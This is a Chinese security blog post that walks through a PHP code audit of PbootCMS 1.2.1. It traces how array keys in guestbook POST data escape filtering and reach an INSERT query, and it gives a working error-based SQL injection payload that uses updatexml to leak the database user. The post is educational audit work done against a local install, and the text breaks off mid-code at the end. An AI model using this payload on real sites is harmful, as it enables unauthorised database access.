<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Threezh1&#39;Blog
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            PHP代码审计之学习SQL注入与审计流程
        </p>
        <hr>
    </div>
    <div class="post-content">
        <!--Table of Contents begin-->
        
            <div id="toc" class="toc-article">
            <strong class="toc-title">目录</strong>
            <a class="js-toggle-toc" href="javascript:void(0)"></a>
            <div class="toc-content">
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E4%B8%80-%E4%BA%86%E8%A7%A3%E7%BD%91%E7%AB%99%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84"><span class="toc-text">过程一 了解网站的基本架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E4%BA%8C-%E4%BA%86%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%8F%82%E6%95%B0%E4%B8%8E%E5%BA%95%E5%B1%82%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5"><span class="toc-text">过程二 了解系统参数与底层过滤情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E7%95%99%E8%A8%80%E5%A4%84insert-sql%E6%B3%A8%E5%85%A5"><span class="toc-text">在线留言处insert sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%8F%E6%B4%9E"><span class="toc-text">复现漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">前台SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">源码分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
            </div>
            </div>
        
        <!--Table of Contents end -->
        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>本来只想复现一下sql注入的几篇文章，但在先知上找到了几篇非常好的入门审计的文章。于是打算按照他的审计思路，熟悉一下PHP代码审计流程，同时整理一下SQL注入的审计方法。</p>
<p>文章地址：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3532">https://xz.aliyun.com/t/3532</a></p>
<a id="more"></a>
<h2 id="过程一-了解网站的基本架构"><a href="#过程一-了解网站的基本架构" class="headerlink" title="过程一 了解网站的基本架构"></a>过程一 了解网站的基本架构</h2><p>文章是拿PbootCMS1.2.1来做演示。 安装好系统，配置好数据库信息，阅读一下网站开发手册。</p>
<p>在审计之前，可以先做以下事情：</p>
<pre><code>1. 了解网站目录结构
使用 tree &gt; tree.txt 来生成文件树。快速了解系统。

2. 确定路由走向
一般是mvc的路由，这个cms还包含自定义路由。</code></pre>
<h2 id="过程二-了解系统参数与底层过滤情况"><a href="#过程二-了解系统参数与底层过滤情况" class="headerlink" title="过程二 了解系统参数与底层过滤情况"></a>过程二 了解系统参数与底层过滤情况</h2><pre><code>1.    了解系统参数过滤的情况
    a)原生GET,POST,REUQEST最简单的方法就是找一个系统中外部可访问的方法，使用
    var_dump($_GET);
    var_dump($_POST);
    var_dump($_REQUEST);
    来查看过滤情况

    文章使用了一个留言新增点，添加了上方语句之后。
    访问:/index.php/Message/add?test=&#39;&quot;;!-=$%^&#123;()&#125;&lt;&gt;
    用此来检测原始数据的过滤情况

    b)系统外部变量获取函数 get()，post()，request()
    可以直接使用seay搜索&quot;get(&quot;来寻找到get数据处理的函数。

2.    了解数据库底层运行方式
    了解数据库增删查改的函数，查看是否有过滤。
    seay搜索：insert( 等。</code></pre>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="在线留言处insert-sql注入"><a href="#在线留言处insert-sql注入" class="headerlink" title="在线留言处insert sql注入"></a>在线留言处insert sql注入</h3><h4 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h4><p><a target="_blank" rel="noopener" href="http://127.0.0.1/index.php/about/10">http://127.0.0.1/index.php/about/10</a></p>
<p>提交留言并抓包。</p>
<p>将：</p>
<pre><code>contacts=1&amp;mobile=2&amp;content=3&amp;checkcode=3231</code></pre>
<p>修改为：</p>
<pre><code>contacts[content`,`create_time`,`update_time`) VALUES (&#39;1&#39;, &#39;1&#39; ,1 and updatexml(1,concat(0x3a,user()),1) );-- a]</code></pre>
<p>提交数据包，可以获得数据库用户名：</p>
<p>pic</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>POST提交的地址为：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/index.php/Message/add">http://127.0.0.1/index.php/Message/add</a></p>
<p>根据路由，位置为： Message模块，add方法。 </p>
<p>具体位置：apps/home/controller/MessageController.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 留言新增</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (time() - session(<span class="string">&#x27;lastsub&#x27;</span>) &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                alert_back(<span class="string">&#x27;您提交太频繁了，请稍后再试！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 验证码验证</span></span><br><span class="line">            <span class="variable">$checkcode</span> = post(<span class="string">&#x27;checkcode&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config(<span class="string">&#x27;message_check_code&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (! <span class="variable">$checkcode</span>) &#123;</span><br><span class="line">                    alert_back(<span class="string">&#x27;验证码不能为空！&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$checkcode</span> != session(<span class="string">&#x27;checkcode&#x27;</span>)) &#123;</span><br><span class="line">                    alert_back(<span class="string">&#x27;验证码错误！&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 读取字段</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="variable">$form</span> = <span class="keyword">$this</span>-&gt;model-&gt;getFormField(<span class="number">1</span>)) &#123;</span><br><span class="line">                alert_back(<span class="string">&#x27;留言表单不存在任何字段，请核对后重试！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 接收数据	</span></span><br><span class="line">            <span class="variable">$mail_body</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$form</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;		</span><br><span class="line">                <span class="variable">$field_data</span> = post(<span class="variable">$value</span>-&gt;name);</span><br><span class="line">                <span class="keyword">if</span> (is_array(<span class="variable">$field_data</span>)) &#123; <span class="comment">// 如果是多选等情况时转换</span></span><br><span class="line">                    <span class="variable">$field_data</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$field_data</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$value</span>-&gt;required &amp;&amp; ! <span class="variable">$field_data</span>) &#123;	</span><br><span class="line">                    alert_back(<span class="variable">$value</span>-&gt;description . <span class="string">&#x27;不能为空！&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$data</span>[<span class="variable">$value</span>-&gt;name] = post(<span class="variable">$value</span>-&gt;name);</span><br><span class="line">                    <span class="variable">$mail_body</span> .= <span class="variable">$value</span>-&gt;description . <span class="string">&#x27;：&#x27;</span> . post(<span class="variable">$value</span>-&gt;name) . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 设置额外数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$data</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;acode&#x27;</span>] = session(<span class="string">&#x27;lg&#x27;</span>);</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;user_ip&#x27;</span>] = ip2long(get_user_ip());</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;user_os&#x27;</span>] = get_user_os();</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;user_bs&#x27;</span>] = get_user_bs();</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;recontent&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;create_user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;update_user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;model-&gt;addMessage(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                session(<span class="string">&#x27;lastsub&#x27;</span>, time()); <span class="comment">// 记录最后提交时间</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;log(<span class="string">&#x27;留言提交成功！&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config(<span class="string">&#x27;message_send_mail&#x27;</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;config(<span class="string">&#x27;message_send_to&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$mail_subject</span> = <span class="string">&quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;</span>;</span><br><span class="line">                    <span class="variable">$mail_body</span> .= <span class="string">&#x27;&lt;br&gt;来自网站&#x27;</span> . get_http_url() . <span class="string">&#x27;（&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&#x27;）&#x27;</span>;</span><br><span class="line">                    sendmail(<span class="keyword">$this</span>-&gt;config(), <span class="keyword">$this</span>-&gt;config(<span class="string">&#x27;message_send_to&#x27;</span>), <span class="variable">$mail_subject</span>, <span class="variable">$mail_body</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                alert_location(<span class="string">&#x27;提交成功！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;log(<span class="string">&#x27;留言提交失败！&#x27;</span>);</span><br><span class="line">                alert_back(<span class="string">&#x27;提交失败！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">error</span>(<span class="string">&#x27;提交失败，请使用POST方式提交！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>提交的步骤为：</p>
<ol>
<li>判断POST提交的数据是否为空</li>
<li>检查字段值是否为空并获取字段值</li>
<li>设置额外数据后提交 调用：<code>$this-&gt;model-&gt;addMessage($data)</code></li>
</ol>
<p>为了了解对POST数据的过滤情况，跟踪接收数据处的post()函数: core\function\helper.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="literal">null</span>, <span class="variable">$require</span> = <span class="literal">false</span>, <span class="variable">$vartext</span> = <span class="literal">null</span>, <span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$condition</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;d_source&#x27;</span> =&gt; <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;d_type&#x27;</span> =&gt; <span class="variable">$type</span>,</span><br><span class="line">        <span class="string">&#x27;d_require&#x27;</span> =&gt; <span class="variable">$require</span>,</span><br><span class="line">        <span class="variable">$name</span> =&gt; <span class="variable">$vartext</span>,</span><br><span class="line">        <span class="string">&#x27;d_default&#x27;</span> =&gt; <span class="variable">$default</span></span><br><span class="line">    </span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> filter(<span class="variable">$name</span>, <span class="variable">$condition</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回的数据进行了处理，继续跟踪filter()函数：core\function\helper.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$varname</span>, <span class="variable">$condition</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...对数据格式进行各种处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> escape_string(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数内容都是对是一些对数据格式的处理，在最后才有对数据内容进行处理的函数。</p>
<p>继续跟踪escape_string()函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取转义数据，支持字符串、数组、对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape_string</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$dropStr</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$string</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$string</span>)) &#123; <span class="comment">// 数组处理</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>[<span class="variable">$key</span>] = escape_string(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_object(<span class="variable">$string</span>)) &#123; <span class="comment">// 对象处理</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>-&gt;<span class="variable">$key</span> = escape_string(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 字符串处理</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dropStr</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$string</span> = htmlspecialchars(trim(<span class="variable">$string</span>), ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">        <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对数据内容进行的过滤为：</p>
<ol>
<li>使用正则将一些sql注入的关键字替换为空</li>
<li>htmlspecialchars()：把预定义的字符转换为 HTML 实体。</li>
<li>addslashes() ：在预定义字符之前添加反斜杠的字符串。</li>
</ol>
<p>但是这里只对数组值进行处理，却没有对数组的键进行处理。所以根据后面insert()函数的插入方式，可以进行sql注入。</p>
<p>以上是对POST传入参数的处理。</p>
<p>接着前面的<code>$this-&gt;model-&gt;addMessage($data)</code></p>
<p>跟踪addMessage函数：apps\api\model\CmsModel.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMessage</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_message&#x27;</span>)-&gt;autoTime()-&gt;insert(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟踪insert()函数：core\basic\Model.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ******************************数据插入*******************************************************</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据插入模型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data</span></span><br><span class="line"><span class="comment"> *            可以为一维或二维数组，</span></span><br><span class="line"><span class="comment"> *            一维数组：array(&#x27;username&#x27;=&gt;&quot;xsh&quot;,&#x27;sex&#x27;=&gt;&#x27;男&#x27;),</span></span><br><span class="line"><span class="comment"> *            二维数组：array(</span></span><br><span class="line"><span class="comment"> *            array(&#x27;username&#x27;=&gt;&quot;xsh&quot;,&#x27;sex&#x27;=&gt;&#x27;男&#x27;),</span></span><br><span class="line"><span class="comment"> *            array(&#x27;username&#x27;=&gt;&quot;gmx&quot;,&#x27;sex&#x27;=&gt;&#x27;女&#x27;)</span></span><br><span class="line"><span class="comment"> *            )</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> boolean $batch</span></span><br><span class="line"><span class="comment"> *            是否启用批量一次插入功能，默认true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> boolean|boolean|array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$batch</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 未传递数据时，使用data函数插入数据</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$data</span> &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;insert(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (! <span class="variable">$data</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$data</span>) == count(<span class="variable">$data</span>, <span class="number">1</span>)) &#123; <span class="comment">// 单条数据 判断是否为多维数组</span></span><br><span class="line">            <span class="variable">$keys</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$values</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;	</span><br><span class="line">                <span class="keyword">if</span> (! is_numeric(<span class="variable">$key</span>)) &#123;	<span class="comment">//判断键是否为数值</span></span><br><span class="line">                    <span class="variable">$keys</span> .= <span class="string">&quot;`&quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;`,&quot;</span>; <span class="comment">//将键转换为 `key`如何拼接起来</span></span><br><span class="line">                    <span class="variable">$values</span> .= <span class="string">&quot;&#x27;&quot;</span> . <span class="variable">$value</span> . <span class="string">&quot;&#x27;,&quot;</span>;<span class="comment">//将值转换为 `value`</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoTimestamp || (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;auto_time&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;auto_time&#x27;</span>] == <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="variable">$keys</span> .= <span class="string">&quot;`&quot;</span> . <span class="keyword">$this</span>-&gt;createTimeField . <span class="string">&quot;`,`&quot;</span> . <span class="keyword">$this</span>-&gt;updateTimeField . <span class="string">&quot;`,&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;intTimeFormat) &#123;</span><br><span class="line">                    <span class="variable">$values</span> .= <span class="string">&quot;&#x27;&quot;</span> . time() . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . time() . <span class="string">&quot;&#x27;,&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$values</span> .= <span class="string">&quot;&#x27;&quot;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&quot;&#x27;,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$keys</span>) &#123; <span class="comment">// 如果插入数据关联字段,则字段以关联数据为准,否则以设置字段为准</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>] = <span class="string">&#x27;(&#x27;</span> . substr(<span class="variable">$keys</span>, <span class="number">0</span>, - <span class="number">1</span>) . <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>] = <span class="string">&quot;(<span class="subst">&#123;$this-&gt;sql[&#x27;field&#x27;]&#125;</span>)&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;value&#x27;</span>] = <span class="string">&quot;(&quot;</span> . substr(<span class="variable">$values</span>, <span class="number">0</span>, - <span class="number">1</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;buildSql(<span 